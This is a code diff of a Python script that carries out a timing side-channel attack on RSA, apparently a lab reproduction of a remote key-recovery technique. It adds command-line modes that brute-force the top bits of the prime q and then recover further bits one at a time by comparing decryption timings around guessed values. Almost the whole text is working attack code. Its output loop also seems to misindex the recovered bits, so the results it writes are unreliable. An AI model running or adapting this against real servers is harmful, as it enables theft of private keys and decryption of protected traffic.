@@ -1,7 +1,9 @@
+import sys
 import sympy
 import socket
 import tls
 import gc
+import pandas
 
 
 q = sympy.Integer(
@@ -145,36 +147,24 @@ def recover_bit(q_bits, i, N, sample_size=7, neighbourhood_size=400):
     num_bits = len(q_bits)
 
     g_low_bits = q_bits[0:i] + [0] + [0] * (num_bits - (i + 1))
-    g_low = attack.bits_to_sympy_integer(g_low_bits)
+    g_low = bits_to_sympy_integer(g_low_bits)
     g_low_neighbours = [g_low + k for k in range(neighbourhood_size)]
 
-    print(
-        "Taking {} samples for bit {} set to low...".format(
-            len(g_low_neighbours) * sample_size, i
-        )
-    )
+    print(g_low_bits[0:20])
 
-    g_low_samples = attack.sample(
-        g_low_neighbours, sample_size=sample_size, u_g=True, N=N
-    )
+    g_low_samples = sample(g_low_neighbours, sample_size=sample_size, u_g=True, N=N)
     g_low_samples = pandas.DataFrame.from_records(
         g_low_samples, columns=["point", "time"]
     )
     T_g_low = g_low_samples.groupby(by="point").min()["time"].sum()
 
     g_high_bits = q_bits[0:i] + [1] + [0] * (num_bits - (i + 1))
-    g_high = attack.bits_to_sympy_integer(g_high_bits)
+    g_high = bits_to_sympy_integer(g_high_bits)
     g_high_neighbours = [g_high + k for k in range(neighbourhood_size)]
 
-    print(
-        "Taking {} samples for bit {} set to high...".format(
-            len(g_high_neighbours) * sample_size, i
-        )
-    )
+    print(g_high_bits[0:20])
 
-    g_high_samples = attack.sample(
-        g_high_neighbours, sample_size=sample_size, u_g=True, N=N
-    )
+    g_high_samples = sample(g_high_neighbours, sample_size=sample_size, u_g=True, N=N)
     g_high_samples = pandas.DataFrame.from_records(
         g_high_samples, columns=["point", "time"]
     )
@@ -184,7 +174,42 @@ def recover_bit(q_bits, i, N, sample_size=7, neighbourhood_size=400):
 
 
 if __name__ == "__main__":
-    print("point time")
-    samples = bruteforce_most_significant_bits(sample_size=10, neighbourhood_size=5)
-    for point, time in samples:
-        print(point, time)
+    if sys.argv[1] == "bruteforce-top-bits":
+        print("point time")
+        samples = bruteforce_most_significant_bits(sample_size=10, neighbourhood_size=5)
+        for point, time in samples:
+            print(point, time)
+
+    elif sys.argv[1] == "recover-bits":
+        known_bits = [int(b) for b in sys.argv[2]]
+
+        q_bits = sympy_integer_to_bits(q)
+
+        print("# Checking given bits against q")
+        for i in range(0, len(known_bits)):
+            print(i, q_bits[i], known_bits[i])
+
+        print("")
+        print("# Recovering bits iteratively...")
+        gaps = []
+        T_g_lows = []
+        T_g_highs = []
+        for i in range(len(known_bits), 20):
+            T_g_low, T_g_high = recover_bit(q_bits, i, N, sample_size=10, neighbourhood_size=800)
+            
+            gap = abs(T_g_low - T_g_high)
+            gaps.append(gap)
+
+            T_g_lows.append(T_g_low)
+            T_g_highs.append(T_g_high)
+
+            print(
+                i, q_bits[i], gap, "-" if T_g_low < T_g_high else "+", T_g_low, T_g_high
+            )
+            print("")
+
+        with open(sys.argv[3], "w") as f:
+            for i in range(20-len(known_bits)):
+                f.write("{} {} {} {} {} {}\n".format(i, q_bits[i], gaps[i], "-" if T_g_lows[i] < T_g_highs[i] else "+", T_g_lows[i], T_g_highs[i]))
+
+
